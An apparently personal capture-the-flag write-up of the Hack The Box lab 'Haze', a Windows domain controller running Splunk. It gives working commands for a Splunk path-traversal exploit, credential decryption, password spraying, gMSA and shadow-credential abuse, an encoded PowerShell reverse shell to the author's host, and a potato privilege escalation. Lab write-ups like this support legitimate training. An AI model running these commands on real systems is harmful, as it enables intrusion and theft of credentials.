---
title: "Haze"
tags:
    - machine
    - Active Directory
date: "2025-06-28"
thumbnail: "/assets/img/thumbnail/Haze.png"
bookmark: true
---

# Description
---

<img src="/assets/img/thumbnail/Haze.png" alt="Haze">

# Solution
---
## Recon
---

```html
# Nmap 7.94SVN scan initiated Tue Apr  1 13:18:26 2025 as: nmap -sV -sC -Pn -p 55741,389,135,3269,49680,8088,47001,8089,49664,139,49668,5985,88,3268,593,53,55710,8000,9389,55713,49666,49679,636,464,55724,445,49665,49672,49886,49667 -oA haze 10.129.49.25
Nmap scan report for haze.htb (10.129.49.25)
Host is up (0.31s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-01 19:19:47Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.haze.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.haze.htb
| Not valid before: 2025-03-05T07:12:20
|_Not valid after:  2026-03-05T07:12:20
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.haze.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.haze.htb
| Not valid before: 2025-03-05T07:12:20
|_Not valid after:  2026-03-05T07:12:20
|_ssl-date: TLS randomness does not represent time
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.haze.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.haze.htb
| Not valid before: 2025-03-05T07:12:20
|_Not valid after:  2026-03-05T07:12:20
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.haze.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.haze.htb
| Not valid before: 2025-03-05T07:12:20
|_Not valid after:  2026-03-05T07:12:20
|_ssl-date: TLS randomness does not represent time
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8000/tcp  open  http          Splunkd httpd
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was http://haze.htb:8000/en-US/account/login?return_to=%2Fen-US%2F
|_http-server-header: Splunkd
| http-robots.txt: 1 disallowed entry 
|_/
8088/tcp  open  ssl/http      Splunkd httpd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2025-03-05T07:29:08
|_Not valid after:  2028-03-04T07:29:08
|_http-server-header: Splunkd
|_http-title: 404 Not Found
| http-robots.txt: 1 disallowed entry 
|_/
8089/tcp  open  ssl/http      Splunkd httpd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2025-03-05T07:29:08
|_Not valid after:  2028-03-04T07:29:08
|_http-server-header: Splunkd
|_http-title: splunkd
| http-robots.txt: 1 disallowed entry 
|_/
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49680/tcp open  msrpc         Microsoft Windows RPC
49886/tcp open  msrpc         Microsoft Windows RPC
55710/tcp open  msrpc         Microsoft Windows RPC
55713/tcp open  msrpc         Microsoft Windows RPC
55724/tcp open  msrpc         Microsoft Windows RPC
55741/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-04-01T19:20:50
|_  start_date: N/A
|_clock-skew: 8h01m11s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Apr  1 13:19:45 2025 -- 1 IP address (1 host up) scanned in 79.66 seconds
```

## Shell as paul.taylor

smb ⇒ no null session

http port 8000 ⇒ splunk login page but can’t proceed more

![image.png](/assets/img/htb/haze/image.png)

https port 8088 ⇒ Not Found

https port 8089 ⇒ Found interesting page related to splunkd

![image.png](/assets/img/htb/haze/image%201.png)

Splunk build 9.2.1 ⇒ [**CVE-2024-36991**](https://nvd.nist.gov/vuln/detail/CVE-2024-36991)

We have [**CVE-2024-36991](https://nvd.nist.gov/vuln/detail/CVE-2024-36991) which can be exploited using this POC** https://github.com/bigb0x/CVE-2024-36991 so getting LFI

The POC by default reads `/etc/passwd` so when we run it we get

```bash
                                                                                                  
┌──(youssif㉿youssif)-[~/Desktop/HTBMachines/haze/CVE-2024-36991]
└─$ python3 CVE-2024-36991.py -u http://10.10.11.61:8000 
/home/youssif/Desktop/HTBMachines/haze/CVE-2024-36991/CVE-2024-36991.py:53: SyntaxWarning: invalid escape sequence '\ '
  """)

                                                                        
  ______     _______     ____   ___ ____  _  _        _____  __   ___   ___  _                     
 / ___\ \   / | ____|   |___ \ / _ |___ \| || |      |___ / / /_ / _ \ / _ \/ |                    
| |    \ \ / /|  _| _____ __) | | | |__) | || |_ _____ |_ \| '_ | (_) | (_) | |                    
| |___  \ V / | |__|_____/ __/| |_| / __/|__   _|________) | (_) \__, |\__, | |                    
 \____|  \_/  |_____|   |_____|\___|_____|  |_|      |____/ \___/  /_/   /_/|_|                    
                                                                                                   
-> POC CVE-2024-36991. This exploit will attempt to read Splunk /etc/passwd file.                  
-> By x.com/MohamedNab1l
-> Use Wisely.

[INFO] Testing single target: http://10.10.11.61:8000
[VLUN] Vulnerable: http://10.10.11.61:8000
:admin:$6$Ak3m7.aHgb/NOQez$O7C8Ck2lg5RaXJs9FrwPr7xbJBJxMCpqIx3TG30Pvl7JSvv0pn3vtYnt8qF4WhL7hBZygwemqn7PBj5dLBm0D1::Administrator:admin:changeme@example.com:::20152
:edward:$6$3LQHFzfmlpMgxY57$Sk32K6eknpAtcT23h6igJRuM1eCe7WAfygm103cQ22/Niwp1pTCKzc0Ok1qhV25UsoUN4t7HYfoGDb4ZCv8pw1::Edward@haze.htb:user:Edward@haze.htb:::20152
:mark:$6$j4QsAJiV8mLg/bhA$Oa/l2cgCXF8Ux7xIaDe3dMW6.Qfobo0PtztrVMHZgdGa1j8423jUvMqYuqjZa/LPd.xryUwe699/8SgNC6v2H/:::user:Mark@haze.htb:::20152
:paul:$6$Y5ds8NjDLd7SzOTW$Zg/WOJxk38KtI.ci9RFl87hhWSawfpT6X.woxTvB4rduL4rDKkE.psK7eXm6TgriABAhqdCPI4P0hcB8xz0cd1:::user:paul@haze.htb:::20152
```

We can read other files with just curl like 

```bash
┌──(youssif㉿youssif)-[~/Desktop/HTBMachines/haze/CVE-2024-36991]
└─$ curl http://10.10.11.61:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/passwd  
:admin:$6$Ak3m7.aHgb/NOQez$O7C8Ck2lg5RaXJs9FrwPr7xbJBJxMCpqIx3TG30Pvl7JSvv0pn3vtYnt8qF4WhL7hBZygwemqn7PBj5dLBm0D1::Administrator:admin:changeme@example.com:::20152
:edward:$6$3LQHFzfmlpMgxY57$Sk32K6eknpAtcT23h6igJRuM1eCe7WAfygm103cQ22/Niwp1pTCKzc0Ok1qhV25UsoUN4t7HYfoGDb4ZCv8pw1::Edward@haze.htb:user:Edward@haze.htb:::20152
:mark:$6$j4QsAJiV8mLg/bhA$Oa/l2cgCXF8Ux7xIaDe3dMW6.Qfobo0PtztrVMHZgdGa1j8423jUvMqYuqjZa/LPd.xryUwe699/8SgNC6v2H/:::user:Mark@haze.htb:::20152
:paul:$6$Y5ds8NjDLd7SzOTW$Zg/WOJxk38KtI.ci9RFl87hhWSawfpT6X.woxTvB4rduL4rDKkE.psK7eXm6TgriABAhqdCPI4P0hcB8xz0cd1:::user:paul@haze.htb:::20152
```

Let’s read configuration files related to splunk and we can get the help from chatGPT to know what are these files’ paths.

**`etc\system\local\authentication.conf`**

➤ Shows encrypted credentials.

```bash
┌──(youssif㉿youssif)-[~/Desktop/HTBMachines/haze/CVE-2024-36991]
└─$ curl http://10.10.11.61:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/system/local/authentication.conf
[splunk_auth]
minPasswordLength = 8
minPasswordUppercase = 0
minPasswordLowercase = 0
minPasswordSpecial = 0
minPasswordDigit = 0

[Haze LDAP Auth]
SSLEnabled = 0
anonymous_referrals = 1
bindDN = CN=Paul Taylor,CN=Users,DC=haze,DC=htb
bindDNpassword = $7$ndnYiCPhf4lQgPhPu7Yz1pvGm66Nk0PpYcLN+qt1qyojg4QU+hKteemWQGUuTKDVlWbO8pY=
charset = utf8
emailAttribute = mail
enableRangeRetrieval = 0
groupBaseDN = CN=Splunk_LDAP_Auth,CN=Users,DC=haze,DC=htb
groupMappingAttribute = dn
groupMemberAttribute = member
groupNameAttribute = cn
host = dc01.haze.htb
nestedGroups = 0
network_timeout = 20
pagelimit = -1
port = 389
realNameAttribute = cn
sizelimit = 1000
timelimit = 15
userBaseDN = CN=Users,DC=haze,DC=htb
userNameAttribute = samaccountname

[authentication]
authSettings = Haze LDAP Auth
authType = LDAP
```

**`etc\auth\splunk.secret`**

➤ Used to encrypt stored credentials – useful for offline cracking or decryption.

```bash
┌──(youssif㉿youssif)-[~/Desktop/HTBMachines/haze/CVE-2024-36991]
└─$ curl http://10.10.11.61:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/auth/splunk.secret
NfKeJCdFGKUQUqyQmnX/WM9xMn5uVF32qyiofYPHkEOGcpMsEN.lRPooJnBdEL5Gh2wm12jKEytQoxsAYA5mReU9.h0SYEwpFMDyyAuTqhnba9P2Kul0dyBizLpq6Nq5qiCTBK3UM516vzArIkZvWQLk3Bqm1YylhEfdUvaw1ngVqR1oRtg54qf4jG0X16hNDhXokoyvgb44lWcH33FrMXxMvzFKd5W3TaAUisO6rnN0xqB7cHbofaA1YV9vgD
```

Found tool called `splunksecrets` to decrypt the hash we found https://github.com/HurricaneLabs/splunksecrets

```bash
┌──(youssif㉿youssif)-[~/Desktop/HTBMachines/haze]
└─$ splunksecrets  splunk-decrypt -S splunk.secret --ciphertext '$7$ndnYiCPhf4lQgPhPu7Yz1pvGm66Nk0PpYcLN+qt1qyojg4QU+hKteemWQGUuTKDVlWbO8pY='
Ld@p_Auth_Sp1unk@2k24
```

as the name is `paul taylor` we used https://github.com/urbanadventurer/username-anarchy to get all the possible usernames to get his username on the target machine.

```bash
┌──(youssif㉿youssif)-[~/Desktop/HTBMachines/haze/username-anarchy]
└─$ ./username-anarchy Paul Taylor
paul
paultaylor
paul.taylor
paultayl
pault
p.taylor
ptaylor
tpaul
t.paul
taylorp
taylor
taylor.p
taylor.paul
pt
```

when I test them i found that the username is `paul.taylor`

```bash
┌──(youssif㉿youssif)-[~/Desktop/HTBMachines/haze]
└─$ nxc smb 10.10.11.61 -u paulTaylorVars -p 'Ld@p_Auth_Sp1unk@2k24' 
SMB         10.10.11.61     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.61     445    DC01             [-] haze.htb\paul:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE
SMB         10.10.11.61     445    DC01             [-] haze.htb\paultaylor:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE
SMB         10.10.11.61     445    DC01             [+] haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24 
```

## Shell as mark.adams

I couldn’t find interesting shares as paul.taylor, but i got the users list

```bash
┌──(youssif㉿youssif)-[~/Desktop/HTBMachines/haze]
└─$ nxc smb 10.10.11.61 -u paul.taylor -p 'Ld@p_Auth_Sp1unk@2k24' --rid-brute | grep SidTypeUser
SMB                      10.10.11.61     445    DC01             500: HAZE\Administrator (SidTypeUser)
SMB                      10.10.11.61     445    DC01             501: HAZE\Guest (SidTypeUser)
SMB                      10.10.11.61     445    DC01             502: HAZE\krbtgt (SidTypeUser)
SMB                      10.10.11.61     445    DC01             1000: HAZE\DC01$ (SidTypeUser)
SMB                      10.10.11.61     445    DC01             1103: HAZE\paul.taylor (SidTypeUser)
SMB                      10.10.11.61     445    DC01             1104: HAZE\mark.adams (SidTypeUser)
SMB                      10.10.11.61     445    DC01             1105: HAZE\edward.martin (SidTypeUser)
SMB                      10.10.11.61     445    DC01             1106: HAZE\alexander.green (SidTypeUser)
SMB                      10.10.11.61     445    DC01             1111: HAZE\Haze-IT-Backup$ (SidTypeUser)
```

trying these users against the password we have

```bash
┌──(youssif㉿youssif)-[~/Desktop/HTBMachines/haze]
└─$ nxc smb 10.10.11.61 -u users.txt  -p 'Ld@p_Auth_Sp1unk@2k24' --continue-on-success
SMB         10.10.11.61     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.61     445    DC01             [-] haze.htb\Administrator:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE
SMB         10.10.11.61     445    DC01             [-] haze.htb\Guest:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE
SMB         10.10.11.61     445    DC01             [-] haze.htb\krbtgt:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE
SMB         10.10.11.61     445    DC01             [-] haze.htb\DC01$:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE
SMB         10.10.11.61     445    DC01             [+] haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24 
SMB         10.10.11.61     445    DC01             [+] haze.htb\mark.adams:Ld@p_Auth_Sp1unk@2k24 
SMB         10.10.11.61     445    DC01             [-] haze.htb\edward.martin:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE
SMB         10.10.11.61     445    DC01             [-] haze.htb\alexander.green:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE
SMB         10.10.11.61     445    DC01             [-] haze.htb\Haze-IT-Backup$:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE
```

and nice we got shell as `mark.adams`

## Shell as haze-IT-backup$

using bloodhound to know how to move further in the machine

```bash
┌──(youssif㉿youssif)-[~/Desktop/HTBMachines/haze/.video]
└─$ bloodhound-python -d haze.htb -c all -u mark.adams -p 'Ld@p_Auth_Sp1unk@2k24' --zip -ns 10.10.11.61
```

mark.adams is in GMSA managers group so we will try to get the password

![image.png](/assets/img/htb/haze/image%202.png)

using `nxc ldap`

```bash
┌──(youssif㉿youssif)-[~]
└─$ nxc ldap 10.10.11.61 -u mark.adams -p 'Ld@p_Auth_Sp1unk@2k24' --gmsa

SMB         10.10.11.61     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
LDAPS       10.10.11.61     636    DC01             [+] haze.htb\mark.adams:Ld@p_Auth_Sp1unk@2k24 
LDAPS       10.10.11.61     636    DC01             [*] Getting GMSA Passwords
LDAPS       10.10.11.61     636    DC01             Account: Haze-IT-Backup$      NTLM:
```

we couldn’t get the password and this maybe because we don’t have the permission, but as we in the GMSA managers group we can give us that permission.

I knew from chatGPT how can i do this…

- List All gMSAs

```bash
*Evil-WinRM* PS C:\Users\mark.adams\Documents> Get-ADServiceAccount -Filter *

DistinguishedName : CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb
Enabled           : True
Name              : Haze-IT-Backup
ObjectClass       : msDS-GroupManagedServiceAccount
ObjectGUID        : 66f8d593-2f0b-4a56-95b4-01b326c7a780
SamAccountName    : Haze-IT-Backup$
SID               : S-1-5-21-323145914-28650650-2368316563-1111
UserPrincipalName :

```

- giving the permission to mark.adams to retrieve the password

```bash
*Evil-WinRM* PS C:\Users\mark.adams\Documents> Set-ADServiceAccount -Identity "Haze-IT-Backup" -PrincipalsAllowedToRetrieveManagedPassword mark.adams
```

- Now get the password’s hash

```bash
┌──(youssif㉿youssif)-[~]
└─$ nxc ldap 10.10.11.61 -u mark.adams -p 'Ld@p_Auth_Sp1unk@2k24' --gmsa

SMB         10.10.11.61     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
LDAPS       10.10.11.61     636    DC01             [+] haze.htb\mark.adams:Ld@p_Auth_Sp1unk@2k24 
LDAPS       10.10.11.61     636    DC01             [*] Getting GMSA Passwords
LDAPS       10.10.11.61     636    DC01             Account: Haze-IT-Backup$      NTLM: a70df6599d5eab1502b38f9c1c3fd828
```

This is the hash of `Haze-IT-Backup$` user

## Shell as edward.martin

bloodhound again using this user for more info and we got this.

![image.png](/assets/img/htb/haze/image%203.png)

So our next path is:

- abusing write-owner creds we have and make `Haze-IT-Backup$` the owner of `SUPPORT_SERVICES` group
- giving that user `generic all` and then he can add himself to the group
- As we became members of `SUPPORT_SERVICES` group we can abuse `AddKeyCredentialLink` using shadow credentials attack using certipy

```bash
┌──(youssif㉿youssif)-[~]
└─$ bloodyAD --host haze.htb -d haze -u 'Haze-IT-Backup$' -p :a70df6599d5eab1502b38f9c1c3fd828  set owner support_services 'Haze-IT-Backup$'
[+] Old owner S-1-5-21-323145914-28650650-2368316563-512 is now replaced by Haze-IT-Backup$ on support_services
                                                                                                                        
┌──(youssif㉿youssif)-[~]
└─$ bloodyAD --host haze.htb -d haze -u 'Haze-IT-Backup$' -p :a70df6599d5eab1502b38f9c1c3fd828  add genericAll support_services 'Haze-IT-Backup$'
[+] Haze-IT-Backup$ has now GenericAll on support_services
                                                                                                                        
┌──(youssif㉿youssif)-[~]
└─$ bloodyAD --host haze.htb -d haze -u 'Haze-IT-Backup$' -p :a70df6599d5eab1502b38f9c1c3fd828  add groupMember support_services 'Haze-IT-Backup$'
[+] Haze-IT-Backup$ added to support_services
                                                                                                                        
┌──(youssif㉿youssif)-[~]
└─$ faketime -f '+8h' certipy-ad shadow auto -username 'Haze-IT-Backup$'@haze.htb -hashes :a70df6599d5eab1502b38f9c1c3fd828 -account 'edward.martin'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'edward.martin'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '1cd3fd1d-918a-fd81-047c-23b3d0e3fc10'
[*] Adding Key Credential with device ID '1cd3fd1d-918a-fd81-047c-23b3d0e3fc10' to the Key Credentials for 'edward.martin'
[*] Successfully added Key Credential with device ID '1cd3fd1d-918a-fd81-047c-23b3d0e3fc10' to the Key Credentials for 'edward.martin'
[*] Authenticating as 'edward.martin' with the certificate
[*] Using principal: edward.martin@haze.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'edward.martin.ccache'
[*] Trying to retrieve NT hash for 'edward.martin'
[*] Restoring the old Key Credentials for 'edward.martin'
[*] Successfully restored the old Key Credentials for 'edward.martin'
[*] NT hash for 'edward.martin': 09e0b3eeb2e7a6b0d419e9ff8f4d91af
```

we used faketime due to time skew and rdate didn’t work.

and we got the hash of edward.martin and we can use evil-winrm to get the user flag.

## Shell as alexander.green

After digging we found that edward.martin has access on `C:\backups` and we found a zip related to splunk

- getting the zip file

```bash
*Evil-WinRM* PS C:\Backups\splunk> download splunk_backup_2024-08-06.zip
                                        
Info: Downloading C:\Backups\splunk\splunk_backup_2024-08-06.zip to splunk_backup_2024-08-06.zip
                                        
Info: Download successful!
```

The zip file is a  backup of the files related to splunk

![image.png](/assets/img/htb/haze/image%204.png)

we can see the content of the files we saw earlier

finding `splunk.secret`

```bash
┌──(youssif㉿youssif)-[~/Desktop/HTBMachines/haze/Splunk]
└─$ find . -name *secret* 2>/dev/null
./etc/system/bin/secret_tool_keyring.py
./etc/auth/splunk.secret
```

![image.png](/assets/img/htb/haze/image%205.png)

The content of the file is different so we may need to decrypt another bindDNpassword

using `grep bindDNpassword . -r` i found it in `./var/run/splunk/confsnapshot/baseline_local/system/local/authentication.conf`

```bash
┌──(youssif㉿youssif)-[~/Desktop/HTBMachines/haze/Splunk]
└─$ cat var/run/splunk/confsnapshot/baseline_local/system/local/authentication.conf
[default]

minPasswordLength = 8
minPasswordUppercase = 0
minPasswordLowercase = 0
minPasswordSpecial = 0
minPasswordDigit = 0

[Haze LDAP Auth]

SSLEnabled = 0
anonymous_referrals = 1
bindDN = CN=alexander.green,CN=Users,DC=haze,DC=htb
bindDNpassword = $1$YDz8WfhoCWmf6aTRkA+QqUI=
charset = utf8
emailAttribute = mail
enableRangeRetrieval = 0
groupBaseDN = CN=Splunk_Admins,CN=Users,DC=haze,DC=htb
groupMappingAttribute = dn
groupMemberAttribute = member
groupNameAttribute = cn
host = dc01.haze.htb
nestedGroups = 0
network_timeout = 20
pagelimit = -1
port = 389
realNameAttribute = cn
sizelimit = 1000
timelimit = 15
userBaseDN = CN=Users,DC=haze,DC=htb
userNameAttribute = samaccountname

[authentication]
authSettings = Haze LDAP Auth
authType = LDAP 
```

decrypting the password

```bash
┌──(youssif㉿youssif)-[~/Desktop/HTBMachines/haze/Splunk]
└─$ splunksecrets splunk-decrypt -S ../splunk1.secret --ciphertext '$1$YDz8WfhoCWmf6aTRkA+QqUI='
/home/youssif/.local/lib/python3.13/site-packages/splunksecrets.py:48: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  algorithm = algorithms.ARC4(key)
Sp1unkadmin@2k24
```

We could login the splunk on port 8000 using `admin:Sp1unkadmin@2k24` and now we are admin in splunk.

After searching i found this [GitHub - cnotin/SplunkWhisperer2: Local privilege escalation, or remote code execution, through Splunk Universal Forwarder (UF) misconfigurations](https://github.com/cnotin/SplunkWhisperer2/tree/master) 

and the payload which will give us the shell is

```bash
┌──(youssif㉿youssif)-[~/…/HTBMachines/haze/SplunkWhisperer2/PySplunkWhisperer2]
└─$ python3 PySplunkWhisperer2_remote.py --host haze.htb --lhost 10.10.16.25 --username admin --password Sp1unkadmin@2k24 --payload 'powershell -ec JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMgA1ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=='
```

Now we got shell as `alexander.green`

## Shell as Administrator

review the permissions we have

```bash
PS C:\Users\alexander.green\Desktop> whoami
haze\alexander.green
PS C:\Users\alexander.green\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

We have `SeImpersonatePrivilege` and this normal for a revshell got from web service.

We can exploit it using `gotpotato` to execute any command as Administrator and i will read the root flag.

```bash
PS C:\Users\alexander.green\Desktop> .\potato.exe -cmd "cmd /c type c:\users\administrator\desktop\root.txt"
[*] CombaseModule: 0x140726759456768
[*] DispatchTable: 0x140726762047816
[*] UseProtseqFunction: 0x140726761339712
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\496e9e23-ab8f-4676-b0cb-a30740df621e\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 0000fc02-108c-ffff-0d31-95834f4b31de
[*] DCOM obj OXID: 0xcef16f404de5fe82
[*] DCOM obj OID: 0x23ed7cdda292fe63
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 932 Token:0x768  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 5964
f******************************8

```

GG !!